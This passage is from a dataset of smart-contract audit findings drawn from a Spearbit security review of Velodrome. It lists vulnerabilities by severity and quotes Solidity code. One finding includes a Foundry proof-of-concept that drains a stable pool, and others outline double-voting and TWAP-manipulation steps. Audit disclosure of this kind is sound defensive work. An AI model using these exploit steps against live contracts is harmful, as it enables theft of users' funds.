address(0)) { uint32 srcRepNum = numCheckpoints[srcRep]; uint256[] storage srcRepOld = srcRepNum > 0 ? _checkpoints[srcRep][srcRepNum - 1].tokenIds : _checkpoints[srcRep][0].tokenIds; uint32 nextSrcRepNum = _findWhatCheckpointToWrite(srcRep); uint256[] storage srcRepNew = _checkpoints[srcRep][nextSrcRepNum].tokenIds; // All the same except _tokenId for (uint256 i = 0; i < srcRepOld.length; i++) { uint256 tId = srcRepOld[i]; if (tId != _tokenId) { srcRepNew.push(tId); } } numCheckpoints[srcRep] = srcRepNum + 1; }", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Rebase rewards cannot be claimed after a veNFT expires", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Note: This issue affects both the RewardsDistributor.claim and RewardsDistributor.claimMany functions A user will claim their rebase rewards via the RewardsDistributor.claim function, which will trigger the VotingE- scrow.deposit_for function. function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } Within the VotingEscrow.deposit_for function, the require statement at line 812 below will verify that the veNFT performing the claim has not expired yet. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } If a user claims the rebase rewards after their veNFT's lock has expired, the VotingEscrow.depositFor function will always revert. As a result, the accumulated rebase rewards will be stuck in the RewardsDistributor contract and users will not be able to retrieve them.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Claimed rebase rewards of managed NFT are not compounded within LockedManagedReward", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Rebase rewards of a managed NFT should be compounded within the LockedManagedRewards contract. However, this was not currently implemented. When someone calls the RewardsDistributor.claim with a managed NFT, the claimed rebase rewards will be locked via the VotingEscrow.depositFor function (Refer the VotingEscrow.depositFor function fails to notify the LockedManagedRewards contract of the incoming rewards. Thus, the rewards do not accrue in the LockedManagedRewards. to Line 277 below). However, function claim(uint256 _tokenId) external returns (uint256) { if (block.timestamp >= timeCursor) _checkpointTotalSupply(); uint256 _lastTokenTime = lastTokenTime; _lastTokenTime = (_lastTokenTime / WEEK) * WEEK; uint256 amount = _claim(_tokenId, _lastTokenTime); if (amount != 0) { IVotingEscrow(ve).depositFor(_tokenId, amount); tokenLastBalance -= amount; } return amount; } One of the purposes of the LockedManagedRewards contract is to accrue rebase rewards claimed by the man- aged NFT so that the users will receive their pro-rata portion of the rebase rewards based on their contribu- tion to the managed NFT when they withdraw their normal NFTs from the managed NFT via the VotingE- scrow.withdrawManaged function. 13 /// @inheritdoc IVotingEscrow function withdrawManaged(uint256 _tokenId) external nonReentrant { ..SNIP.. uint256 _reward = IReward(_lockedManagedReward).earned(address(token), _tokenId); ..SNIP.. // claim locked rewards (rebases + compounded reward) address[] memory rewards = new address[](1); rewards[0] = address(token); IReward(_lockedManagedReward).getReward(_tokenId, rewards); If the rebase rewards are not accrued in the LockedManagedRewards, users will not receive their pro-rata portion of the rebase rewards during withdrawal.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Malicious users could deposit normal NFTs to a managed NFT on behalf of others without their permission", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The VotingEscrow.depositManaged function did not verify that the caller (msg.sender) is the owner of the _tokenId. As a result, a malicious user can deposit normal NFTs to a managed NFT on behalf of others without their permission. function depositManaged(uint256 _tokenId, uint256 _mTokenId) external nonReentrant { require(escrowType[_mTokenId] == EscrowType.MANAGED, \"VotingEscrow: can only deposit into managed nft\"); ,! require(!deactivated[_mTokenId], \"VotingEscrow: inactive managed nft\"); require(escrowType[_tokenId] == EscrowType.NORMAL, \"VotingEscrow: can only deposit normal nft\"); require(!voted[_tokenId], \"VotingEscrow: nft voted\"); require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); require(_balanceOfNFT(_tokenId, block.timestamp) > 0, \"VotingEscrow: no balance to deposit\"); ..SNIP.. The owner of a normal NFT will have their voting balance transferred to a malicious managed NFT, resulting in loss of rewards and voting power for the victim. Additionally, a malicious owner of a managed NFT could aggregate 14 voting power of the victim's normal NFTs, and perform malicious actions such as stealing the rewards from the victims or use its inflated voting power to pass malicious proposals.", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "First liquidity provider of a stable pair can DOS the pool", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The invariant k of a stable pool is calculated as follows Pair.sol#L505 function _k(uint256 x, uint256 y) internal view returns (uint256) { if (stable) { uint256 _x = (x * 1e18) / decimals0; uint256 _y = (y * 1e18) / decimals1; uint256 _a = (_x * _y) / 1e18; uint256 _b = ((_x * _x) / 1e18 + (_y * _y) / 1e18); return (_a * _b) / 1e18; // x3y+y3x >= k } else { return x * y; // xy >= k } } The value of _a = (x * y ) / 1e18 = 0 due to rounding error when x*y < 1e18. The rounding error can lead to the invariant k of stable pools equals zero, and the trader can steal whatever is left in the pool. The first liquidity provider can DOS the pair by: 1.mint a small amount of liquidity to the pool, 2. Steal whatever is left in the pool, 3. Repeat step 1, and step 2 until the overflow of the total supply. To prevent the issue of rounding error, the reserve of a pool should never go too small. The mint function which was borrowed from uniswapV2 has a minimum liquidity check of sqrt(a * b) > MINIMUM_LIQUIDITY; This, however, isn't safe enough to protect the invariant formula of stable pools. Pair.sol#L344-L363 uint256 internal constant MINIMUM_LIQUIDITY = 10**3; // ... function mint(address to) external nonReentrant returns (uint256 liquidity) { // ... uint256 _amount0 = _balance0 - _reserve0; uint256 _amount1 = _balance1 - _reserve1; uint256 _totalSupply = totalSupply(); if (_totalSupply == 0) { liquidity = Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY; //@audit what about the fee? _mint(address(1), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens - ,! cannot be address(0) // ... } This is the POC of an exploit extended from Pair.t.sol 15 contract PairTest is BaseTest { // ... function drainPair(Pair pair, uint initialFraxAmount, uint initialDaiAmount) internal { DAI.transfer(address(pair), 1); uint amount0; uint amount1; if (address(DAI) < address(FRAX)) { amount0 = 0; amount1 = initialFraxAmount - 1; } else { amount1 = 0; amount0 = initialFraxAmount - 1; } pair.swap(amount0, amount1, address(this), new bytes(0)); FRAX.transfer(address(pair), 1); if (address(DAI) < address(FRAX)) { amount0 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount1 = 0; } else { amount1 = initialDaiAmount; // initialDaiAmount + 1 - 1 amount0 = 0; } pair.swap(amount0, amount1, address(this), new bytes(0)); } function testDestroyPair() public { deployCoins(); deal(address(DAI), address(this), 100 ether); deal(address(FRAX), address(this), 100 ether); deployFactories(); Pair pair = Pair(factory.createPair(address(DAI), address(FRAX), true)); for(uint i = 0; i < 10; i++) { DAI.transfer(address(pair), 10_000_000); FRAX.transfer(address(pair), 10_000_000); // as long as 10_000_000^2 < 1e18 uint liquidity = pair.mint(address(this)); console.log(\"pair:\", address(pair), \"liquidity:\", liquidity); console.log(\"total liq:\", pair.balanceOf(address(this))); drainPair(pair, FRAX.balanceOf(address(pair)) , DAI.balanceOf(address(pair))); console.log(\"DAI balance:\", DAI.balanceOf(address(pair))); console.log(\"FRAX balance:\", FRAX.balanceOf(address(pair))); require(DAI.balanceOf(address(pair)) == 1, \"should drain DAI balance\"); require(FRAX.balanceOf(address(pair)) == 2, \"should drain FRAX balance\"); } DAI.transfer(address(pair), 1 ether); FRAX.transfer(address(pair), 1 ether); vm.expectRevert(); pair.mint(address(this)); } }", "labels": ["Spearbit", "Velodrome", "Severity: High Risk"]}, {"title": "Certain functions are unavailable after opting in to the \"auto compounder", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Certain features (e.g., delegation, governance voting) of a veNFT would not be available if the veNFT is transferred to the auto compounder. Let x be a managed veNFT. When an \"auto compounder\" is created, ownership of x is transferred to the AutoCom- pounder contract, and any delegation within x is cleared. The auto compounder can perform gauge weight voting using x via the provided AutoCompounder.vote function. However, it loses the ability to perform any delegation with x because the AutoCompounder contract does not contain a function that calls the VotingEscrow.delegate function. Only the owner of x, the AutoCompounder contract, can call the VotingEscrow.delegate function. x also loses the ability to vote on governance proposals as the existing AutoCompounder contract does not support this feature. Once the owner of the managed NFTs has opted in to the \"auto compounder,\" it is not possible for them to subsequently \"opt out.\" Consequently, if they need to exercise delegation and governance voting, they will be unable to do so, exacerbating the impact. 17", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Claimable gauge distributions are locked when killGauge is called", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "When a gauge is killed, the claimable[_gauge] key value is cleared. Because any rewards received by the Voter contract are indexed and distributed in proportion to each pool's weight, this claimable amount is permanently locked within the contract.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Bribe and fee token emissions can be gamed by users", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "A user may vote or reset their vote once per epoch. Votes persist across epochs and once a user has distributed their votes among their chosen pools, the poke() function may be called by any user to update the target user's decayed veNFT token balance. However, the poke() function is not hooked into any of the reward distribution contracts. As a result, a user is incentivized to vote as soon as they create their lock and avoid re-voting in subsequent epochs. The amount deposited via Reward._deposit() does not decay linearly as how it is defined under veToken mechanics. Therefore, users could continue to earn trading fees and bribes even after their lock has expired. Simultaneously, users can poke() other users to lower their voting weight and maximize their own earnings.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Compromised or malicious owner can drain the VotingEscrow contract of VELO tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The FactoryRegistry contract is an Ownable contract with the ability to control the return value of the managedRewardsFactory() function. As such, whenever createManagedLockFor() is called in VotingEscrow, the FactoryRegistry contract queries the managedRewardsFactory() function and subsequently calls createRe- wards() on this address. If ownership of the FactoryRegistry contract is compromised or malicious, the createRewards() external call can return any arbitrary _lockedManagedReward address which is then given an infinite token approval. As a result, it's possible for all locked VELO tokens to be drained and hence, this poses a significant centralization risk to the protocol.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Unsafe casting in RewardsDistributor leads to underflow of veForAt", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Solidity does not revert when casting a negative number to uint. Instead, it underflows to a large number. In the RewardDistributor contract, the balance of a token at specific time is calculated as follows IVotingEscrow.Point memory pt = IVotingEscrow(_ve).userPointHistory(_tokenId, epoch); Math.max(uint256(int256(pt.bias - pt.slope * (int128(int256(_timestamp - pt.ts))))), 0); This supposes to return zero when the calculated balance is a negative number. However, it underflows to a large number. This would lead to incorrect reward distribution if third-party protocols depend on this function, or when further updates make use of this codebase.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Proposals can be griefed by front-running and canceling", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because the Governor uses OZ's Implementation, a griefter can front-run a valid proposal with the same settings and then immediately cancel it. You can avoid the grief by writing a macro contract that generates random descriptions to avoid the front-run. See: code-423n4/2022-09-nouns-builder-findings#182.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "pairFor does not correctly sort tokens when overriding for SinkConverter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The router will always search for pairs by sorting tokenA and TokenB. Notably, for the velo and Velo2 pair, the Router will not perform the sorting 21 //Router.sol#L69-L73 if (factory == defaultFactory) { if ((tokenA == IPairFactory(defaultFactory).velo()) && (tokenB == ,! IPairFactory(defaultFactory).veloV2())) { return IPairFactory(defaultFactory).sinkConverter(); } } Meaning that the pair for Velo -> Velo2 will be the Sink but the pair for Velo2 -> Velo will be some other pair. Additionally, you can front-run a call to setSinkConverter() by calling createPair() with the same parameters. How- ever, the respective values for getPair() would be overwritten with the sinkConverter address. This could lead to some weird and unexpected behaviour as we would still have an invalid Pair contract for the v1 and v2 velo tokens.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Inconsistent between balanceOfNFT, balanceOfNFTAt and _balanceOfNFT functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The balanceOfNFT function implements a flash-loan protection that returns zero voting balance if ownershipChange[_tokenId] == block.number. However, this was not consistently applied to the balanceOfNF- TAt and _balanceOfNFT functions. VotingEscrow.sol function balanceOfNFT(uint256 _tokenId) external view returns (uint256) { if (ownershipChange[_tokenId] == block.number) return 0; return _balanceOfNFT(_tokenId, block.timestamp); } As a result, Velodrome or external protocols calling the balanceOfNFT and balanceOfNFTAt external functions will receive different voting balances for the same veNFT depending on which function they called. Additionally, the internal _balanceOfNFT function, which does not have flash-loan protection, is called by the VotingEscrow.getVotes function to compute the voting balance of an account. The VotingEscrow.getVotes function appears not to be used in any in-scope contracts, however, this function might be utilized by some exter- nal protocols or off-chain components to tally the votes. If that is the case, a malicious user could flash-loan the veNFTs to inflate the voting balance of their account.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Nudge check will break once limit is reached", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because you're checking both sides, once oldRate reaches the MAX_RATE, every new nudge call will revert. Meaning that if _newRate ever get's to MAXIMUM_TAIL_RATE or MINIMUM_TAIL_RATE, nudge will stop working.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "ownershipChange can be sidestepped", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The check there is to prevent adding to managed after a transfer from or creation require(ownershipChange[_tokenId] != block.number, \"VotingEscrow: flash nft protection\"); However, it doesn't prevent adding and removing from other managed tokens, merging, or splitting. For this reason, we can sidestep the lock by splitting Because ownershipChange is updated exclusively on _transferFrom, we can side-step it being set by splitting the lock into a new one which will not have the lock.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "The fromBlock variable of a checkpoint is not initialized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "A checkpoint contains a fromBlock variable which stores the block number the checkpoint is created. /// @notice A checkpoint for marking delegated tokenIds from a given block struct Checkpoint { uint256 fromBlock; uint256[] tokenIds; } However, it was found that the fromBlock variable of a checkpoint was not initialized anywhere in the codebase. Therefore, any function that relies on the fromBlock of a checkpoint will break. The VotingEscrow._findWhatCheckpointToWrite and VotingEscrow.getPastVotesIndex functions were found to rely on the fromBlock variable of a checkpoint for computation. The following is a list of functions that calls these two affected functions. _findWhatCheckpointToWrite -> _moveTokenDelegates -> _transferFrom _findWhatCheckpointToWrite -> _moveTokenDelegates -> _mint _findWhatCheckpointToWrite -> _moveTokenDelegates -> _burn _findWhatCheckpointToWrite -> _moveAllDelegates -> _delegate -> delegate/delegateBySig getPastVotesIndex -> getTokenIdsAt getPastVotesIndex -> getPastVotes -> GovernorSimpleVotes._getVotes Instance 1 - VotingEscrow._findWhatCheckpointToWrite function The VotingEscrow._findWhatCheckpointToWrite function verifies if the fromBlock of the latest checkpoint of an account is equal to the current block number. If true, the function will return the index number of the last checkpoint. function _findWhatCheckpointToWrite(address account) internal view returns (uint32) { uint256 _blockNumber = block.number; uint32 _nCheckPoints = numCheckpoints[account]; if (_nCheckPoints > 0 && _checkpoints[account][_nCheckPoints - 1].fromBlock == _blockNumber) { return _nCheckPoints - 1; } else { return _nCheckPoints; } } As such, this function does not work as intended and will always return the index of a new checkpoint. Instance 2 - VotingEscrow.getPastVotesIndex function The VotingEscrow.getPastVotesIndex function relies on the fromBlock of the latest checkpoint for optimization purposes. If the request block number is the most recently updated checkpoint, it will return the latest index immediately and skip the binary search. Since the fromBlock variable is not populated, the optimization will not work. 24 function getPastVotesIndex(address account, uint256 blockNumber) public view returns (uint32) { uint32 nCheckpoints = numCheckpoints[account]; if (nCheckpoints == 0) { return 0; } // First check most recent balance if (_checkpoints[account][nCheckpoints - 1].fromBlock <= blockNumber) { return (nCheckpoints - 1); } // Next check implicit zero balance if (_checkpoints[account][0].fromBlock > blockNumber) { return 0; } uint32 lower = 0; uint32 upper = nCheckpoints - 1; while (upper > lower) { uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow Checkpoint storage cp = _checkpoints[account][center]; if (cp.fromBlock == blockNumber) { return center; } else if (cp.fromBlock < blockNumber) { lower = center; } else { upper = center - 1; } } return lower; }", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Double voting by shifting the voting power between managed and normal NFTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Owners of normal NFTs and managed NFTs could potentially collude to double vote, which affects the fairness of the gauge weight voting. A group of malicious veNFT owners could exploit this and use the inflated voting balance to redirect the VELO emission to gauges where they have a vested interest, causing losses to other users. The following shows that it is possible to increase the weight of a pool by 2000 with a 1000 voting balance within a single epoch by shifting the voting power between managed and normal NFTs. For simplicity's sake, assume the following  Alice is the owner of a managed NFT (tokenID=888)  Bob is the owner of a normal NFT (tokenID=999)  Alice's managed NFT (tokenID=888) only consists of one (1) normal NFT (tokenID=999) that belongs to Bob being locked up. The following steps are executed within the same epoch. At the start, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is 1000 25  The 1000 voting came from the normal NFT (tokenID=999) during the deposit  weights[_tokenId][_mTokenId] = _weight | weights[999][888] = 1000;  Voting power of Bob's normal NFT (tokenID=999) is zero (0)  Weight of Pool X = 0 Alice calls Voter.vote function with his managed NFT (tokenID=888), and increases the weight of Pool X by 1000. Subsequently, the lastVoted[_tokenId] = _timestamp at Line 222 in the Voter.vote function will be set, and the onlyNewEpoch modifier will ensure Alice cannot use the same managed NFT (tokenID=888) to vote again in the current epoch. However, Bob could call the VotingEscrow.withdrawManaged to withdraw his normal NFT (tokenID=999) from the managed NFT (tokenID=888). Within the function, it will call the internal _checkpoint function to \"transfer\" the voting power from managed NFT (tokenID=888) to normal NFT (tokenID=999). At this point, the state is as follows:  Voting power of Alice's managed NFT (tokenID=888) is zero (0)  Voting power of Bob's normal NFT (tokenID=999) is 1000  Weight of Pool X = 1000 Bob calls Voter.vote function with his normal NFT (tokenID=999) and increases the weight of Pool X by 1000. Since normal NFT (tokenID=999) has not voted in the current epoch, it is allowed to vote. The weight of Pool X becomes 2000. It was observed that a mechanism is in place to punish and disincentivize malicious behaviors from a managed NFT owner. The protocol's emergency council could deactivate Managed NFTs involved in malicious activities via the VotingEscrow.setManagedState function. In addition, the ability to create a managed NFT is restricted to only an authorized manager and protocol's governor. These factors help to mitigate some risks related to this issue to a certain extent.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "MetaTX is using the incorrect Context", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Throughout the codebase, the code uses Context for _msgSender() The implementation chosen will resolve each _msgSender() to msg.sender which is inconsistent with the goal of allowing MetaTX.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "depositFor function should be restricted to approved NFT types", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The depositFor function was found to accept NFT of all types (normal, locked, managed) without restriction. function depositFor(uint256 _tokenId, uint256 _value) external nonReentrant { LockedBalance memory oldLocked = _locked[_tokenId]; require(_value > 0, \"VotingEscrow: zero amount\"); require(oldLocked.amount > 0, \"VotingEscrow: no existing lock found\"); require(oldLocked.end > block.timestamp, \"VotingEscrow: cannot add to expired lock, withdraw\"); _depositFor(_tokenId, _value, 0, oldLocked, DepositType.DEPOSIT_FOR_TYPE); } Instance 1 - Anyone can call depositFor against a locked NFT Users should not be allowed to increase the voting power of a locked NFT by calling the depositFor function as locked NFTs are not supposed to vote. Thus, any increase in the voting balance of locked NFTs will not increase the gauge weight, and as a consequence, the influence and yield of the deposited VELO will be diminished. In addition, the locked balance will be overwritten when the veNFT is later withdrawn from the managed veNFT, resulting in a loss of funds. Instance 2 - Anyone can call depositFor against a managed NFT Only the RewardsDistributor.claim function should be allowed to call depositFor function against a managed NFT to process rebase rewards claimed and to compound the rewards into the LockedManagedReward contract. However, anyone could also increase the voting power of a managed NFT directly by calling depositFor with a tokenId of a managed NFT, which breaks the invariant.", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Lack of vetoer can lead to 51% attack", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The veto power is important functionality in a governance system in order to protect from malicious proposals. However there is lack of vetoer in VeloGovernor , this might lead to Velodrome losing their veto power unintentionally and open to 51% attack. With 51% attack a malicous actor can change the governor in Voter contract or by pass the tokens whitelist adding new gauge with malicious token. References  dialectic.ch/editorial/nouns-governance-attack-2  code4rena.com/reports/2022-09-nouns-builder/#m-11-loss-of-veto-power-can-lead-to-51-attack", "labels": ["Spearbit", "Velodrome", "Severity: Medium Risk"]}, {"title": "Compromised or malicious owner can siphon rewards from the Voter contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The createGauge() function takes a _gaugeFactory parameter which is checked to be approved by the FactoryRegistry contract. However, the owner of this contract can approve any arbitrary FactoryRegistry contract, hence the return value of the IGaugeFactory(_gaugeFactory).createGauge() call may return an EOA which steals rewards every time notifyRewardAmount() is called.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Missing nonReentrant modifier on a state changing checkpoint function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The checkpoint() function will call the internal _checkpoint() function which ultimately fills the point history and potentially updates the epoch state variable.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Close to half of the trading fees may be paid one epoch late", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Due to how left() is implemented in Reward (returning the total amount of rewards for the epoch), _claimFees() will not queue rewards until the new fees are greater than the current ones for the epoch. This can cause the check to be false for values that are up to half minus one reward. Consider the following example:  First second of a new epoch, we add 100 rewards.  For the rest of the epoch, we accrue 99.99 rewards.  The check is always false, the 99 rewards will not be added to this epoch, despite having accrued them during this epoch.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Not synced with Epochs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "If there's enough delays in calling the notifyRewardAmount() function, a full desync can happen.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Dust losses in notifyRewardAmount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "This should cause dust losses which are marginal but are never queued back. See private link to code-423n4/2022-10-3xcalibur-findings#410. Vs SNX implementation which does queue the dust back. Users may be diluted by distributing the _leftover amount of another epoch period of length DURATION if the total supply deposited in the gauge continues to increase over this same period. On the flip side, they may also benefit if users withdraw funds from the gauge during the same epoch.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "All rewards are lost until Gauge or Bribe deposits are non-zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Flagging this old finding which is still valid for all SNX like gauges. See private link to code- 423n4/2022-10-3xcalibur-findings#429. Because the rewards are emitted over DURATION, if no deposit has happened and notifyRewardAmount() is called with a non-zero value, all rewards will be forfeited until totalSupply is non-zero as nobody will be able to claim them.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Difference in getPastTotalSupply and propose", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The getPastTotalSupply() function currently uses block.number, but OpenZeppelin's propose() function will use votes from block.timestamp - 1 as seen here. This could enable  Front-run and increase total supply to cause proposer to be unable to propose().  Require higher tokens than expected if total supply can grow within one block. Proposals could be denied as long as a whale is willing to lock more tokens to increase the total supply and thereby increase the proposal threshold.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Delaying update_period may award more emissions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "First nudge can be performed on the first tail period, delaying update_period() may award more emissions, because of the possible delay with the first proposal, waiting to call update_period() will allow the use of the updated nudged value. This is marginal (1BPS in difference)", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Incorrect math for future factories and pools", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "Because quoteLiquidity() assumes an x * y = k formula, its quote value will be incorrect when using a custom factory that uses a different curve. //Router.sol#L673-L700 function _quoteZapLiquidity( address tokenA, address tokenB, bool stable, address _factory, uint256 amountADesired, uint256 amountBDesired, uint256 amountAMin, uint256 amountBMin ) internal view returns (uint256 amountA, uint256 amountB) { require(amountADesired >= amountAMin); require(amountBDesired >= amountBMin); (uint256 reserveA, uint256 reserveB) = getReserves(tokenA, tokenB, stable, _factory); if (reserveA == 0 && reserveB == 0) { (amountA, amountB) = (amountADesired, amountBDesired); } else { uint256 amountBOptimal = quoteLiquidity(amountADesired, reserveA, reserveB); if (amountBOptimal <= amountBDesired) { require(amountBOptimal >= amountBMin, \"Router: insufficient B amount\"); (amountA, amountB) = (amountADesired, amountBOptimal); } else { uint256 amountAOptimal = quoteLiquidity(amountBDesired, reserveB, reserveA); assert(amountAOptimal <= amountADesired); require(amountAOptimal >= amountAMin, \"Router: insufficient A amount\"); (amountA, amountB) = (amountAOptimal, amountBDesired); } } } The math may be incorrect for future factories and pools, while the current math is valid for x * y = k, any new AMM math (e.g Bounded / V3 math, Curve V2, Oracle driven AMMs) may turn out to be incorrect. This may cause issues when performing zaps with custom factories.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Add function to remove whitelisted token and NFT", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "In the Voter contract, the governor can only add tokens and NFTs to the whitelist array. However, it is missing the functionality to remove whitelisted tokens and NFTs. If any whitelisted token or NFT has an issue, it cannot be removed from the list.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Unnecessary approve in Router", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The newly added Zap feature uses max approvals, which are granted to pairs. However, the Pair contract does not pull tokens from the router, and therefore unnecessarily calls approve() in the router. Because of the possibility of specifying a custom factory, attackers will be able to set up approvals from any token to their contracts. This may be used to scam end-users, for example by performing a swap on these malicious factories.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "The current value of a Pair is not always returning a 30-minute TWAP and can be manipulated.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The current function returns a current TWAP. It fetches the last observation and calculates the TWAP between the last observation. The observation is pushed every thirty minutes. However, the interval between current timestamp and the last observation varies a lot. In most cases, the TWAP interval is shorter than 30 minutes. //Pair.sol#L284-L288 uint256 timeElapsed = block.timestamp - _observation.timestamp; @audit: timeElapsed can be much smaller than 30 minutes. uint256 _reserve0 = (reserve0Cumulative - _observation.reserve0Cumulative) / timeElapsed; uint256 _reserve1 = (reserve1Cumulative - _observation.reserve1Cumulative) / timeElapsed; amountOut = _getAmountOut(amountIn, tokenIn, _reserve0, _reserve1); If the last observation is newly updated, the timeElapsed will be much shorter than 30 minutes. The cost of price manipulation is cheaper in this case. Assume the last observation is updated at T. The exploiter can launch an attack at T + 30_MINUTES - 1 1. At T + 30_MINUTES - 1, the exploiter tries to manipulate the price of the pair. Assume the price is moved to 100x. 2. At T + 30_MINUTES, the exploiter pokes the pair. The pair push an observation with the price = 100x. 3. At T + 30_MINUTES + 1, the exploiter tries to exploit external protocols. The current function fetches the It ends up last observation and calculates the TWAP between the last observation and the current price. calculating the two-block-interval TWAP.", "labels": ["Spearbit", "Velodrome", "Severity: Low Risk"]}, {"title": "Calculation error of getAmountOut leads to revert of Router", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Velodrome-Spearbit-Security-Review.pdf", "body": "The function getAmountOut in Pair calculates the correct swap amount and token price. //Pair.sol#L442-L444 function _f(uint256 x0, uint256 y) internal pure returns (uint256) { return (x0 * ((((y * y) / 1e18) * y) / 